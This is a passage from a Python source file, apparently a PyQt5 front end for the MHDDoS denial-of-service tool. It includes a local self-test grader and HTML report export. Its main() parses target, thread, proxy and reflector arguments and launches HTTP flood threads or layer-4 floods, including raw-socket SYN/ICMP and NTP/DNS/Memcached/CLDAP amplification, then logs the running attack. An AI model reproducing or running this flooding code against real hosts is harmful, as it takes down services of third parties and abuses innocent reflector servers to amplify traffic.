            self.log_message(f"🧪 Grader import failed: {e}")
            return
        # Reconstruct sample dicts from the deques (matches /__stats__ keys)
        samples = []
        for i in range(len(self._selftest_hist_t)):
            samples.append({
                "rps_5s": self._selftest_hist_rps[i],
                "p50_ms": self._selftest_hist_p50[i],
                "p99_ms": self._selftest_hist_p99[i],
                "cpu_pct": self._selftest_hist_cpu[i],
                "mem_mb": self._selftest_hist_mem[i],
                "errors_total": 0,  # We don't track per-sample errors in deque
            })
        grade = grade_run(samples)
        self._selftest_last_grade = grade
        verdict = grade.get("verdict", "?")
        score = grade.get("score", 0)

        # Color-coded summary
        if score >= 80:
            color = "#ff3333"
        elif score >= 60:
            color = "#ff9933"
        elif score >= 40:
            color = "#ffcc33"
        else:
            color = "#88ccff"
        summary = (
            f"📊 Score {score}/100  ·  {verdict}  ·  "
            f"peak RPS={grade.get('peak_rps', 0):.1f}  "
            f"peak p99={grade.get('peak_p99', 0):.0f}ms  "
            f"peak CPU={grade.get('peak_cpu', 0):.0f}%  "
            f"({grade.get('rps_score', 0):.1f}+{grade.get('latency_score', 0):.1f}+"
            f"{grade.get('cpu_score', 0):.1f}+{grade.get('errors_score', 0):.1f})"
        )
        self._selftest_last_grade_label.setText(summary)
        self._selftest_last_grade_label.setStyleSheet(
            f"QLabel {{ font-family: monospace; padding: 8px; "
            f"background: #1a1a1a; border: 1px solid {color}; border-radius: 3px; "
            f"color: {color}; font-weight: bold; }}"
        )
        self.log_message(f"🧪 Grade computed: {summary}")

    def _selftest_save_report(self):
        """Export the cached grade as a self-contained HTML report."""
        if not self._selftest_last_grade:
            QMessageBox.information(
                self, "No Grade",
                "Click '📊 Grade Last Run' first before saving the report."
            )
            return
        try:
            from selftest_grader import build_html_report
        except Exception as e:
            self.log_message(f"🧪 Grader import failed: {e}")
            return
        port = self._selftest_port_spin.value()
        target_url = f"http://127.0.0.1:{port}/api/heavy"
        # Wrap single grade as a 1-row results list for the HTML builder
        results = [{
            "method": "Self-Test (live)",
            **self._selftest_last_grade,
        }]
        html = build_html_report(results, target_url, len(self._selftest_hist_t))
        file_path, _ = QFileDialog.getSaveFileName(
            self, "Save Self-Test Report",
            str(__dir__ / f"selftest_report_{int(time.time())}.html"),
            "HTML Files (*.html)"
        )
        if not file_path:
            return
        try:
            Path(file_path).write_text(html)
            self.log_message(f"🏆 Report saved: {file_path}")
            QMessageBox.information(
                self, "Report Saved",
                f"Self-test grade report exported to:\n{file_path}"
            )
        except Exception as e:
            QMessageBox.warning(self, "Save Failed", f"Could not save: {e}")

    def closeEvent(self, event):
        """Auto-cleanup before GUI exit:
           - kill self-test server subprocess (orphaned aiohttp would keep
             port 8888 occupied across runs)
           - terminate any multiprocess attack workers (independent processes)
           - clear attack event so daemon threads exit cleanly
        """
        # 1) Self-test server cleanup
        proc = getattr(self, '_selftest_proc', None)
        if proc is not None and proc.poll() is None:
            try:
                proc.terminate()
                # Brief wait, then force-kill if still alive
                waited = 0.0
                while proc.poll() is None and waited < 1.5:
                    time.sleep(0.1)
                    waited += 0.1
                if proc.poll() is None:
                    proc.kill()
            except Exception:
                pass

        # 2) Multiprocess attack workers cleanup
        if hasattr(self, '_mp_processes') and self._mp_processes:
            for p in self._mp_processes:
                try:
                    if p.is_alive():
                        p.terminate()
                except Exception:
                    pass

        # 3) Stop active attacks and cleanup everything before exit
        try:
            self._cleanup_on_close()
        except Exception:
            pass

        try:
            app = QApplication.instance()
            if app is not None:
                app.quit()
        except Exception:
            pass

        super().closeEvent(event)



def main():
    if len(sys.argv) > 1:
        with suppress(KeyboardInterrupt):
            with suppress(IndexError):
                one = sys.argv[1].upper()

                if one == "HELP":
                    raise IndexError()
                if one == "TOOLS":
                    ToolsConsole.runConsole()
                if one == "STOP":
                    ToolsConsole.stop()

                method = one
                host = None
                port = None
                url = None
                event = Event()
                event.clear()
                target = None
                urlraw = sys.argv[2].strip()
                if not urlraw.startswith("http"):
                    urlraw = "http://" + urlraw

                if method not in Methods.ALL_METHODS:
                    exit("Method Not Found %s" %
                         ", ".join(Methods.ALL_METHODS))

                if method in Methods.LAYER7_METHODS:
                    url = URL(urlraw)
                    host = url.host

                    if method != "TOR":
                        try:
                            host = gethostbyname(url.host)
                        except Exception as e:
                            exit('Cannot resolve hostname ', url.host, str(e))

                    threads = int(sys.argv[4])
                    rpc = int(sys.argv[6])
                    timer = int(sys.argv[7])
                    proxy_ty = int(sys.argv[3].strip())
                    proxy_li = Path(__dir__ / "files/proxies/" /
                                    sys.argv[5].strip())
                    useragent_li = Path(__dir__ / "files/useragent.txt")
                    referers_li = Path(__dir__ / "files/referers.txt")
                    bombardier_path = Path.home() / "go/bin/bombardier"
                    proxies: Any = set()

                    if method == "BOMB":
                        assert (
                                bombardier_path.exists()
                                or bombardier_path.with_suffix('.exe').exists()
                        ), (
                            "Install bombardier: "
                            "https://github.com/MHProDev/MHDDoS/wiki/BOMB-method"
                        )

                    if len(sys.argv) == 9:
                        logger.setLevel("DEBUG")

                    if not useragent_li.exists():
                        exit("The Useragent file doesn't exist ")
                    if not referers_li.exists():
                        exit("The Referer file doesn't exist ")

                    uagents = set(a.strip()
                                  for a in useragent_li.open("r+").readlines())
                    referers = set(a.strip()
                                   for a in referers_li.open("r+").readlines())

                    if not uagents: exit("Empty Useragent File ")
                    if not referers: exit("Empty Referer File ")

                    if threads > 1000:
                        logger.warning("Thread is higher than 1000")
                    if rpc > 100:
                        logger.warning(
                            "RPC (Request Pre Connection) is higher than 100")

                    proxies = handleProxyList(con, proxy_li, proxy_ty, url)
                    for thread_id in range(threads):
                        HttpFlood(thread_id, url, host, method, rpc, event,
                                  uagents, referers, proxies).start()

                if method in Methods.LAYER4_METHODS:
                    target = URL(urlraw)

                    port = target.port
                    target = target.host

                    try:
                        target = gethostbyname(target)
                    except Exception as e:
                        exit('Cannot resolve hostname ', url.host, e)

                    if port > 65535 or port < 1:
                        exit("Invalid Port [Min: 1 / Max: 65535] ")

                    if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD", "SYN", "ICMP"} and \
                            not ToolsConsole.checkRawSocket():
                        exit("Cannot Create Raw Socket")

                    if method in Methods.LAYER4_AMP:
                        logger.warning("this method need spoofable servers please check")
                        logger.warning("https://github.com/MHProDev/MHDDoS/wiki/Amplification-ddos-attack")

                    threads = int(sys.argv[3])
                    timer = int(sys.argv[4])
                    proxies = None
                    ref = None

                    if not port:
                        logger.warning("Port Not Selected, Set To Default: 80")
                        port = 80

                    if method in {"SYN", "ICMP"}:
                        __ip__ = __ip__

                    if len(sys.argv) >= 6:
                        argfive = sys.argv[5].strip()
                        if argfive:
                            refl_li = Path(__dir__ / "files" / argfive)
                            if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD"}:
                                if not refl_li.exists():
                                    exit("The reflector file doesn't exist")
                                if len(sys.argv) == 7:
                                    logger.setLevel("DEBUG")
                                ref = set(a.strip()
                                          for a in Tools.IP.findall(refl_li.open("r").read()))
                                if not ref: exit("Empty Reflector File ")

                            elif argfive.isdigit() and len(sys.argv) >= 7:
                                if len(sys.argv) == 8:
                                    logger.setLevel("DEBUG")
                                proxy_ty = int(argfive)
                                proxy_li = Path(__dir__ / "files/proxies" / sys.argv[6].strip())
                                proxies = handleProxyList(con, proxy_li, proxy_ty)
                                if method not in {"MINECRAFT", "MCBOT", "TCP", "CPS", "CONNECTION"}:
                                    exit("this method cannot use for layer4 proxy")

                            else:
                                logger.setLevel("DEBUG")
                    
                    protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
                    
                    if method == "MCBOT":
                        with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
                            Tools.send(s, Minecraft.handshake((target, port), protocolid, 1))
                            Tools.send(s, Minecraft.data(b'\x00'))

                            protocolid = Tools.protocolRex.search(str(s.recv(1024)))
                            protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"] if not protocolid else int(protocolid.group(1))
                            
                            if protocolid < 47 or protocolid > 758:
                                protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]

                    for _ in range(threads):
                        Layer4((target, port), ref, method, event,
                               proxies, protocolid).start()

                logger.info(
                    f"{bcolors.WARNING}Attack Started to{bcolors.OKBLUE} %s{bcolors.WARNING} with{bcolors.OKBLUE} %s{bcolors.WARNING} method for{bcolors.OKBLUE} %s{bcolors.WARNING} seconds, threads:{bcolors.OKBLUE} %d{bcolors.WARNING}!{bcolors.RESET}"
                    % (target or url.host, method, timer, threads))
                event.set()
                ts = time.time()
                while time.time() < ts + timer:
                    logger.debug(
                        f'{bcolors.WARNING}Target:{bcolors.OKBLUE} %s,{bcolors.WARNING} Port:{bcolors.OKBLUE} %s,{bcolors.WARNING} Method:{bcolors.OKBLUE} %s{bcolors.WARNING} PPS:{bcolors.OKBLUE} %s,{bcolors.WARNING} BPS:{bcolors.OKBLUE} %s / %d%%{bcolors.RESET}' %
                        (target or url.host,
                         port or (url.port or 80),
                         method,
                         Tools.humanformat(int(REQUESTS_SENT)),
                         Tools.humanbytes(int(BYTES_SEND)),
                         round((time.time() - ts) / timer * 100, 2)))
                    REQUESTS_SENT.set(0)
                    BYTES_SEND.set(0)
                    sleep(1)

                event.clear()
            exit()

            ToolsConsole.usage()
            exitinput = input()
    else:
        # Install global exception hook to capture crashes and write to disk
        def _global_excepthook(exc_type, exc_value, exc_tb):
            try:
                tb = ''.join(traceback.format_exception(exc_type, exc_value, exc_tb))
                log_path = Path(__dir__) / 'crash.log'
                with log_path.open('a') as fh:
                    fh.write(f"\n=== {datetime.utcnow().isoformat()} UTC ===\n")
                    fh.write(tb)
                try:
                    # Best-effort GUI dialog to inform user
                    from PyQt5.QtWidgets import QMessageBox, QApplication
                    if QApplication.instance() is None:
                        _app = QApplication(sys.argv)
                        QMessageBox.critical(None, "Unexpected Error", f"The application crashed. See {log_path}")
                        _app.quit()
                    else:
                        QMessageBox.critical(None, "Unexpected Error", f"The application crashed. See {log_path}")
                except Exception:
                    pass
            finally:
                # Delegate to default hook as well
                try:
                    sys.__excepthook__(exc_type, exc_value, exc_tb)
                except Exception:
                    pass

        sys.excepthook = _global_excepthook

        app = QApplication(sys.argv)
        window = MainWindow()
        window.show()
        try:
            app.aboutToQuit.connect(window._cleanup_on_close)
        except Exception:
            pass
        try:
            rc = app.exec_()
        except Exception:
            # In-case Qt raises an exception that bubbles up
            _global_excepthook(*sys.exc_info())
            rc = 1
        sys.exit(rc)


if __name__ == '__main__':
    main()